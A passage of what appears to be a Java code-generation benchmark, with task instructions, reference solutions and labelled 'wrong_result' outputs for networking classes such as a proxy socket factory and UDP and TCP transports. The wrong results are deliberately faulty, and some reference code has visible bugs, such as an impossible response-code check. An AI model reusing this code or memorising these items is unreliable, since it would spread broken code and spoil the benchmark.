line);\n                    JSONObject object = new JSONObject(line);\n                    String returnStr = null;\n                    String errStr = null;\n\n                    try {\n                        if(line.contains(\"return\"))\n                            returnStr = object.getString(\"return\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n\n                    if (returnStr != null) {\n                        stringBuilder.append(line);\n                        stringBuilder.append(\"\\n\");\n                        break;\n                    }\n\n                    try {\n                        if(line.contains(\"error\"))\n                            errStr = object.getString(\"error\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n                    stringBuilder.append(line);\n                    stringBuilder.append(\"\\n\");\n                    if (errStr != null) {\n                        break;\n                    }\n                } else\n                    break;\n            } while (true);\n        } catch (Exception ex) {\n            Log.e(TAG, \"Could not get Response: \" + ex.getMessage());\n            if(Config.debugQmp)\n                ex.printStackTrace();\n        }\n        return stringBuilder.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class QmpClient {\n    public static final String TAG = \"QmpClient\";\n    private static final String REQUEST_COMMAND_MODE = \"{\\\"execute\\\": \\\"qmp_capabilities\\\"}\";\n    private boolean external;\n    private Socket socket;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public void setExternal(boolean value) {\n        this.external = value;\n    }\n\n    public String sendCommand(String command) {\n        if (socket == null || !socket.isConnected()) {\n            establishConnection();\n        }\n        sendRequest(out, command);\n        return getResponse(in);\n    }\n\n    private void establishConnection() {\n        try {\n            if (external) {\n                socket = new Socket(\"localhost\", 4444);\n            } else {\n                socket = new Socket(new File(\"/tmp/qmp-socket\"));\n            }\n            out = new PrintWriter(socket.getOutputStream(), true);\n            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void sendRequest(PrintWriter out, String request) {\n        out.println(request);\n    }\n\n    private String getResponse(BufferedReader in) {\n        return tryGetResponse(in);\n    }\n\n    private String tryGetResponse(BufferedReader in) {\n        int retries = 3;\n        while (retries > 0) {\n            try {\n                String line = in.readLine();\n                if (line != null && line.trim().startsWith(\"{\")) {\n                    return line;\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            retries--;\n        }\n        return null;\n    }\n}"
  },
  {
    "Task_id": 587,
    "Instruction": "Task Description: Implement a TCP-based unicast communication class that enables message exchange between a client and server, supporting both sending and receiving of messages with proper resource management.\n\nClass Description: UnicastTestTcp is a class that establishes TCP connections for unicast communication between two endpoints. It acts as both a client (connecting to a remote server) and a server (accepting connections from remote clients). The class handles message serialization/deserialization and provides thread-safe operations for sending messages.\n\nAttributes:\n- local: InetSocketAddress - The local address and port for server socket binding\n- remote: InetSocketAddress - The remote address and port for client connection\n- sock: Socket - The client socket for outgoing connections\n- output: DataOutputStream - The output stream for sending data to the remote endpoint\n- output_lock: Lock - A reentrant lock for thread-safe output operations\n- srv_sock: ServerSocket - The server socket for accepting incoming connections\n- acceptor: Acceptor - A thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up both server and client sockets. Throws Exception if initialization fails.\n- writeMessage(Message msg, DataOutputStream out) -> static void - Serializes and writes a message to the output stream. Throws Exception if writing fails.\n- readMessage(DataInput in) -> static Message - Reads and deserializes a message from the input stream. Throws Exception if reading fails.\n- receive(Message msg) -> void - Processes received messages based on their type (START or DATA)\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Continuously accepts new connections and processes incoming messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from an established connection. Throws Exception if processing fails.",
    "Canonical_solution": "import org.jgroups.*;\nimport org.jgroups.stack.IpAddress;\nimport org.jgroups.util.DefaultSocketFactory;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcp {\n    protected InetSocketAddress local, remote;\n    protected Socket sock;\n    protected DataOutputStream output;\n    protected final Lock output_lock = new ReentrantLock();\n    protected ServerSocket srv_sock;\n    protected Acceptor acceptor;\n\n    protected static final boolean TCP_NODELAY = false;\n    protected static final int SOCK_SEND_BUF_SIZE = 200 * 1000;\n    protected static final int SOCK_RECV_BUF_SIZE = 200 * 1000;\n    protected static final byte START = 1;\n    protected static final byte DATA = 2;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n        srv_sock = Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(),\n                                         local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor = new Acceptor();\n        acceptor.start();\n\n        sock = new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output = new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected static final void writeMessage(final Message msg, DataOutputStream out) throws Exception {\n        byte flags = 0;\n        if(msg.getDest() == null)\n            flags += (byte)2;\n        out.writeShort(Version.version);\n        out.writeByte(flags);\n        msg.writeTo(out);\n    }\n\n    protected static final Message readMessage(DataInput in) throws Exception {\n        short ver = in.readShort();\n        byte flags = in.readByte();\n        Message msg = new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    protected class Acceptor extends Thread {\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in = new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            Message msg = readMessage(in);\n            receive(msg);\n        }\n    }\n\n    public void receive(Message msg) {\n        byte[] buf = msg.getArray();\n        byte type = buf[msg.getOffset()];\n\n        switch(type) {\n            case START:\n                ByteBuffer tmp = ByteBuffer.wrap(buf, 1+msg.getOffset(), Global.LONG_SIZE);\n                int num_msgs = (int)tmp.getLong();\n                System.out.println(\"Received START message with \" + num_msgs + \" messages\");\n                break;\n            case DATA:\n                System.out.println(\"Received DATA message\");\n                break;\n            default:\n                System.err.println(\"Type \" + type + \" is invalid\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.net.*;\nimport java.io.*;\nimport java.util.concurrent.locks.*;\n\npublic class UnicastTestTcp {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private final Lock output_lock = new ReentrantLock();\n    private ServerSocket srv_sock;\n    private Acceptor acceptor;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n\n        srv_sock = new ServerSocket();\n        srv_sock.bind(local);\n        acceptor = new Acceptor();\n        acceptor.start();\n\n        sock = new Socket();\n        sock.connect(remote);\n        output = new DataOutputStream(sock.getOutputStream());\n    }\n\n    public static void writeMessage(Message msg, DataOutputStream out) throws Exception {\n        output_lock.lock();\n        try {\n            ObjectOutputStream oos = new ObjectOutputStream(out);\n            oos.writeObject(msg);\n            oos.flush();\n        } finally {\n            output_lock.unlock();\n        }\n    }\n\n    public static Message readMessage(DataInput in) throws Exception {\n        ObjectInputStream ois = new ObjectInputStream(in);\n        return (Message) ois.readObject();\n    }\n\n    public void receive(Message msg) {\n        if (msg.type == Message.Type.START) {\n            // Handle start message logic\n        } else if (msg.type == Message.Type.DATA) {\n            // Handle data message logic\n        }\n    }\n\n    private class Acceptor extends Thread {\n        public void run() {\n            while (true) {\n                try {\n                    Socket clientSocket = srv_sock.accept();\n                    DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n                    handleRequest(in);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleRequest(DataInputStream in) throws Exception {\n            while (true) {\n                try {\n                    Message msg = readMessage(in);\n                    receive(msg);\n                } catch (EOFException e) {\n                    break;\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 589,
    "Instruction": "Task Description: Create a custom SocketFactory implementation that supports both direct connections and proxy connections (SOCKS and HTTP) with optional authentication for HTTP proxies.\n\nClass Description: CustomSocketFactory is a SocketFactory subclass that provides socket creation capabilities with proxy support. It handles both direct connections and connections through SOCKS or HTTP proxies, including HTTP proxy authentication when required.\n\nAttributes:\n- proxyHost: String - The hostname or IP address of the proxy server\n- proxyPort: int - The port number of the proxy server\n- proxyUser: String - The username for proxy authentication (optional)\n- proxyPass: String - The password for proxy authentication (optional)\n- proxyType: Proxy.Type - The type of proxy (SOCKS or HTTP)\n\nMethods:\n- createSocket(String host, int port) -> Socket - Creates a socket connected to the specified host and port\n- createSocket(String host, int port, InetAddress localHost, int localPort) -> Socket - Creates a socket connected to the specified host and port, binding to the specified local address and port\n- createSocket(InetAddress host, int port) -> Socket - Creates a socket connected to the specified InetAddress and port\n- createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) -> Socket - Creates a socket connected to the specified InetAddress and port, binding to the specified local address and port\n- createSocket() -> Socket - Creates an unconnected socket with proxy configuration\n- connectToProxy(Socket socket) -> void - Handles HTTP proxy connection and authentication (private method)\n- getBasicAuthStr() -> String - Generates Base64 encoded proxy authentication string (private method)\n- readLine(InputStream in) -> String - Reads a line from the input stream (private method)\n- getResponseCode(String statusLine) -> int - Extracts HTTP response code from status line (private static method)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.Base64;\nimport javax.net.SocketFactory;\n\npublic class CustomSocketFactory extends SocketFactory {\n\n    private String proxyHost, proxyUser, proxyPass;\n    private int proxyPort;\n    private Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort,\n            String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n        this.proxyType = proxyType;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port)\n            throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port);\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost,\n            int localPort) throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port, localHost,\n                localPort);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        return this.createSocket(host, port, null, 0);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port,\n            InetAddress localAddress, int localPort) throws IOException {\n        Socket socket = this.createSocket();\n        if (localAddress != null) {\n            socket.bind(new InetSocketAddress(localAddress, localPort));\n        }\n        if (address != null) {\n            socket.connect(new InetSocketAddress(address, port));\n        }\n\n        if (this.proxyType == Proxy.Type.HTTP && proxyUser != null) {\n            connectToProxy(socket);\n        }\n\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        Proxy proxy = Proxy.NO_PROXY;\n        if (this.proxyType == Proxy.Type.SOCKS) {\n            proxy = new Proxy(Proxy.Type.SOCKS,\n                    new InetSocketAddress(proxyHost, proxyPort));\n        } else if (this.proxyType == Proxy.Type.HTTP) {\n            if (proxyUser == null || proxyUser.length() < 1) {\n                proxy = new Proxy(Proxy.Type.HTTP,\n                        new InetSocketAddress(proxyHost, proxyPort));\n            }\n        }\n\n        Socket socket = new Socket(proxy);\n        return socket;\n    }\n\n    private void connectToProxy(Socket socket) throws IOException {\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n        StringBuilder requestHeaders = new StringBuilder();\n        requestHeaders\n                .append(\"HTTP \" + proxyHost + \":\" + proxyPort + \" HTTP/1.1\\r\\n\")\n                .append(\"Host: \" + proxyHost + \":\" + proxyPort + \"\\r\\n\");\n        String proxyAuth = getBasicAuthStr();\n        if (proxyAuth != null) {\n            requestHeaders\n                    .append(\"Proxy-Authorization: basic \" + proxyAuth + \"\\r\\n\");\n        }\n        requestHeaders.append(\"\\r\\n\");\n        out.write(requestHeaders.toString().getBytes(\"utf-8\"));\n        out.flush();\n\n        String statusLine = readLine(in);\n        if (statusLine == null) {\n            socket.close();\n            throw new IOException(\"Proxy sent blank response\");\n        }\n\n        int responseCode = getResponseCode(statusLine);\n        if (responseCode < 200 && responseCode >= 300) {\n            socket.close();\n            throw new IOException(\"Invalid response code: \" + responseCode);\n        }\n\n        while (true) {\n            String line = readLine(in);\n            if (line.length() < 1)\n                break;\n        }\n    }\n\n    private String getBasicAuthStr() {\n        if (proxyUser != null && proxyUser.length() > 0) {\n            try {\n                return (Base64.getEncoder().encodeToString(\n                        (proxyUser + \":\" + (proxyPass == null ? \"\" : proxyPass))\n                                .getBytes(\"utf-8\")));\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            }\n        }\n        return null;\n    }\n\n    public final String readLine(InputStream in) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        while (true) {\n            int x = in.read();\n            if (x == -1)\n                throw new IOException(\n                        \"Unexpected EOF while reading header line\");\n            if (x == '\\n')\n                return buf.toString();\n            if (x != '\\r')\n                buf.append((char) x);\n        }\n    }\n\n    public static final int getResponseCode(String statusLine) {\n        String arr[] = statusLine.split(\" \");\n        if (arr.length < 2)\n            return 400;\n        return Integer.parseInt(arr[1]);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class CustomSocketFactory extends SocketFactory {\n    private final String proxyHost;\n    private final int proxyPort;\n    private final String proxyUser;\n    private final String proxyPass;\n    private final Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort, String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n        this.proxyType = proxyType;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port) throws IOException {\n        return createSocketInternal(host, port, null, -1);\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost, int localPort) throws IOException {\n        return createSocketInternal(host, port, localHost, localPort);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        return createSocketInternal(host.getHostAddress(), port, null, -1);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) throws IOException {\n        return createSocketInternal(address.getHostAddress(), port, localAddress, localPort);\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        return createSocketInternal(null, -1, null, -1);\n    }\n\n    private Socket createSocketInternal(String host, int port, InetAddress localHost, int localPort) throws IOException {\n        if (proxyHost != null && !proxyHost.isEmpty()) {\n            if (proxyType == Proxy.Type.SOCKS) {\n                return createSocketWithSocks(host, port, localHost, localPort);\n            } else {\n                return createSocketWithHttpProxy(host, port, localHost, localPort);\n            }\n        } else {\n            return createDirectSocket(host, port, localHost, localPort);\n        }\n    }\n\n    private Socket createSocketWithSocks(String host, int port, InetAddress localHost, int localPort) throws IOException {\n        Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(proxyHost, proxyPort));\n        return SocketFactory.getDefault().createSocket(proxy, host, port, localHost != null, localPort);\n    }\n\n    private Socket createSocketWithHttpProxy(String host, int port, InetAddress localHost, int localPort) throws IOException {\n        Socket socket = new Socket();\n        if (localHost != null) {\n            socket.bind(new InetSocketAddress(localHost, localPort));\n        }\n        socket.connect(new InetSocketAddress(proxyHost, proxyPort));\n        connectToProxy(socket, host, port);\n        return socket;\n    }\n\n    private void connectToProxy(Socket socket, String host, int port) throws IOException {\n        String request = \"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\" +\n                         \"Host: \" + host + \":\" + port + \"\\r\\n\" +\n                         \"User-Agent: Java-Proxy-Client\\r\\n\";\n        if (proxyUser != null && !proxyUser.isEmpty() && proxyPass != null && !proxyPass.isEmpty()) {\n            String auth = getBasicAuthStr();\n            request += \"Proxy-Authorization: \" + auth + \"\\r\\n\";\n        }\n        request += \"\\r\\n\";\n        OutputStream out = socket.getOutputStream();\n        out.write(request.getBytes());\n        out.flush();\n\n        InputStream in = socket.getInputStream();\n        String line = readLine(in);\n        int responseCode = getResponseCode(line);\n        if (responseCode != 200) {\n            throw new IOException(\"HTTP proxy connect failed: \" + line);\n        }\n    }\n\n    private String getBasicAuthStr() {\n        String auth = proxyUser + \":\" + proxyPass;\n        return Base64.getEncoder().encodeToString(auth.getBytes());\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int ch;\n        while ((ch = in.read()) != -1) {\n            if (ch == '\\n') break;\n            sb.append((char) ch);\n        }\n        return sb.toString();\n    }\n\n    private static int getResponseCode(String statusLine) {\n        if (statusLine == null) return -1;\n        int idx = statusLine.indexOf(' ');\n        if (idx == -1) return -1;\n        try {\n            return Integer.parseInt(statusLine.substring(0, idx));\n        } catch (NumberFormatException e) {\n            return -1;\n        }\n    }\n\n    private Socket createDirectSocket(String host, int port, InetAddress localHost, int localPort) throws IOException {\n        Socket socket = new Socket();\n        if (localHost != null) {\n            socket.bind(new InetSocketAddress(localHost, localPort));\n        }\n        socket.connect(new InetSocketAddress(host, port));\n        return socket;\n    }\n}"
  },
  {
    "Task_id": 59,
    "Instruction": "Task Description: Create a Java class that provides functionality to read and check the existence of URL-based resources, with support for character encoding.\n\nClass Description: The UrlTemplateResource class is designed to handle URL resources by providing methods to read their content and check their existence. It supports specifying character encoding for proper text reading and handles both regular URL connections and HTTP-specific operations.\n\nAttributes:\n- url: URL - The URL of the resource to be accessed\n- characterEncoding: String - The character encoding to be used when reading the resource (can be null)\n\nMethods:\n- Constructor: UrlTemplateResource(String path, String characterEncoding) -> void - Creates an instance with a URL path string and character encoding\n- Constructor: UrlTemplateResource(URL url, String characterEncoding) -> void - Creates an instance with a URL object and character encoding\n- reader: reader() -> Reader - Returns a Reader for the URL resource with optional character encoding\n- inputStream: inputStream() -> InputStream - Internal method that opens and returns an InputStream for the URL\n- exists: exists() -> boolean - Checks if the URL resource exists by attempting to connect to it",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic final class UrlTemplateResource {\n\n    private final URL url;\n    private final String characterEncoding;\n\n    public UrlTemplateResource(final String path, final String characterEncoding) throws MalformedURLException {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(final URL url, final String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        final InputStream inputStream = inputStream();\n        if (this.characterEncoding != null && !this.characterEncoding.trim().isEmpty()) {\n            return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream), this.characterEncoding));\n        }\n        return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream)));\n    }\n\n    private InputStream inputStream() throws IOException {\n        final URLConnection connection = this.url.openConnection();\n        if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n            connection.setUseCaches(true);\n        }\n\n        final InputStream inputStream;\n        try {\n            inputStream = connection.getInputStream();\n        } catch (final IOException e) {\n            if (connection instanceof HttpURLConnection) {\n                ((HttpURLConnection) connection).disconnect();\n            }\n            throw e;\n        }\n        return inputStream;\n    }\n\n    public boolean exists() {\n        try {\n            final URLConnection connection = this.url.openConnection();\n            if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n                connection.setUseCaches(true);\n            }\n\n            if (connection instanceof HttpURLConnection) {\n                final HttpURLConnection httpConnection = (HttpURLConnection) connection;\n                httpConnection.setRequestMethod(\"HEAD\");\n                int responseCode = httpConnection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    return true;\n                } else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {\n                    return false;\n                }\n                if (httpConnection.getContentLength() >= 0) {\n                    return true;\n                }\n                httpConnection.disconnect();\n                return false;\n            }\n\n            if (connection.getContentLength() >= 0) {\n                return true;\n            }\n\n            final InputStream is = inputStream();\n            is.close();\n            return true;\n        } catch (final IOException ignored) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class UrlTemplateResource {\n    private final URL url;\n    private final String characterEncoding;\n\n    public UrlTemplateResource(String path, String characterEncoding) {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(URL url, String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        InputStream inputStream = inputStream();\n        return new InputStreamReader(inputStream, characterEncoding);\n    }\n\n    protected InputStream inputStream() throws IOException {\n        URLConnection connection = url.openConnection();\n        connection.setConnectTimeout(5000);\n        return connection.getInputStream();\n    }\n\n    public boolean exists() {\n        try {\n            URLConnection connection = url.openConnection();\n            connection.setConnectTimeout(5000);\n            connection.connect();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 590,
    "Instruction": "Task Description: Write a Java function that tests the behavior of a servlet when the client closes the socket early during an HTTP POST request. The function should verify that the servlet properly handles the premature connection closure by detecting an exception and not completing normally.\n\nFunction Description: The function `testServletInputStreamEarlyClose` creates a TCP client socket, sends an HTTP POST request with a large body, and immediately closes the socket before the server can fully process the request. It then verifies that the servlet detected the premature closure through exception handling.\n\nInput: None (The function uses predefined constants and helper classes like `DefaultServer`, `TestHttpClient`, and `EarlyCloseClientServlet`)\n\nOutput: None (The function asserts expected behavior through JUnit assertions. Side effects include socket communication and servlet state changes)",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic void testServletInputStreamEarlyClose() throws Exception {\n    Assume.assumeFalse(DefaultServer.isH2());\n    TestHttpClient client = new TestHttpClient();\n    EarlyCloseClientServlet.reset();\n    try (Socket socket = new Socket()) {\n        socket.connect(DefaultServer.getDefaultServerAddress());\n        try {\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i < 10000; ++i) {\n                sb.append(\"hello world\\r\\n\");\n            }\n            String request = \"POST /servletContext/\" + SERVLET + \" HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n            OutputStream outputStream = socket.getOutputStream();\n\n            outputStream.write(request.getBytes(\"US-ASCII\"));\n            outputStream.flush();\n            socket.close();\n\n            Assert.assertTrue(EarlyCloseClientServlet.getLatch().await(10, TimeUnit.SECONDS));\n            Assert.assertFalse(EarlyCloseClientServlet.isCompletedNormally());\n            Assert.assertTrue(EarlyCloseClientServlet.isExceptionThrown());\n        } finally {\n            client.getConnectionManager().shutdown();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void testServletInputStreamEarlyClose() {\n    try {\n        TestHttpClient client = new TestHttpClient();\n        client.setServer(new EarlyCloseClientServlet());\n        client.start();\n        client.setRequest(\"POST /test HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 1024\\r\\n\\r\\n\");\n        client.sendRequest();\n        client.closeSocket();\n        fail(\"Expected exception but none thrown\");\n    } catch (IOException e) {\n        // Expected exception due to early socket closure\n    }\n}"
  },
  {
    "Task_id": 593,
    "Instruction": "Task Description: Implement a UDP-based transport class for inter-process communication that can function as either a server or client, handling both sending and receiving of datagram packets.\n\nClass Description: UdpTransport is a class that provides UDP communication capabilities, allowing processes to send and receive datagram packets. It can be configured as either a server (listening on a specific port) or a client (sending to a server). The class maintains a list of cluster members and supports asynchronous packet reception through a dedicated receiver thread.\n\nAttributes:\n- sock: DatagramSocket - The UDP socket used for communication\n- receiver_thread: Receiver - Thread for handling incoming packets\n- receiver: RtReceiver - Callback interface for received packets\n- host: InetAddress - The host address for communication\n- port: int - The port number for communication (default: 7800)\n- server: boolean - Flag indicating whether this instance is a server\n- log: Log - Logger instance for logging messages\n- members: List<SocketAddress> - List of cluster member addresses\n\nMethods:\n- receiver(RtReceiver) -> void - Sets the receiver callback for incoming packets\n- localAddress() -> Object - Returns the local socket address\n- clusterMembers() -> List<? extends Object> - Returns the list of cluster members\n- start(String...) -> void - Initializes the transport with given options and starts the receiver thread\n- stop() -> void - Stops the transport and closes the socket\n- send(Object, byte[], int, int) -> void - Sends a datagram packet to the specified destination\n- Receiver.run() -> void - Internal thread method that continuously receives packets (private class method)",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class UdpTransport implements RtTransport {\n    protected DatagramSocket      sock;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server;\n    protected final Log           log=LogFactory.getLog(UdpTransport.class);\n    protected List<SocketAddress> members=new ArrayList<>();\n\n    public UdpTransport() {\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public Object localAddress() {return members != null? members.get(0) : null;}\n\n    public List<? extends Object> clusterMembers() {\n        return members;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            sock=new DatagramSocket(port, host);\n            System.out.println(\"server started (ctrl-c to kill)\");\n        }\n        else {\n            sock=new DatagramSocket();\n            members.add(sock.getLocalSocketAddress());\n            members.add(new InetSocketAddress(host, port));\n        }\n        receiver_thread=new Receiver();\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        Util.close(sock);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        DatagramPacket packet=new DatagramPacket(buf, offset, length, (SocketAddress)dest);\n        sock.send(packet);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            DatagramPacket packet=new DatagramPacket(buf, 0, buf.length);\n            for(;;) {\n                try {\n                    sock.receive(packet);\n                    if(packet.getLength() != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + packet.getLength());\n                    if(receiver != null)\n                        receiver.receive(packet.getSocketAddress(), buf, packet.getOffset(), packet.getLength());\n                }\n                catch(IOException ex) {\n                    break;\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpTransport {\n    private DatagramSocket sock;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server;\n    private Log log;\n    private List<SocketAddress> members;\n\n    public void receiver(RtReceiver r) {\n        this.receiver = r;\n    }\n\n    public Object localAddress() {\n        return sock.getLocalAddress();\n    }\n\n    public List<? extends Object> clusterMembers() {\n        return members;\n    }\n\n    public void start(String... options) {\n        if (server) {\n            try {\n                sock = new DatagramSocket(port);\n            } catch (IOException e) {\n                log.error(\"Failed to bind socket\", e);\n            }\n        } else {\n            try {\n                sock = new DatagramSocket();\n            } catch (IOException e) {\n                log.error(\"Failed to create socket\", e);\n            }\n        }\n        receiver_thread = new Thread(new Receiver());\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        if (receiver_thread != null) {\n            receiver_thread.interrupt();\n        }\n        if (sock != null) {\n            sock.close();\n        }\n    }\n\n    public void send(Object destination, byte[] data, int offset, int length) {\n        try {\n            DatagramPacket packet = new DatagramPacket(data, offset, length, (SocketAddress) destination);\n            sock.send(packet);\n        } catch (IOException e) {\n            log.error(\"Failed to send packet\", e);\n        }\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            byte[] buffer = new byte[1024];\n            while (true) {\n                try {\n                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                    sock.receive(packet);\n                    if (receiver != null) {\n                        receiver.onReceive(packet.getData(), packet.getLength(), packet.getSocketAddress());\n                    }\n                } catch (IOException e) {\n                    log.error(\"Error receiving packet\", e);\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 595,
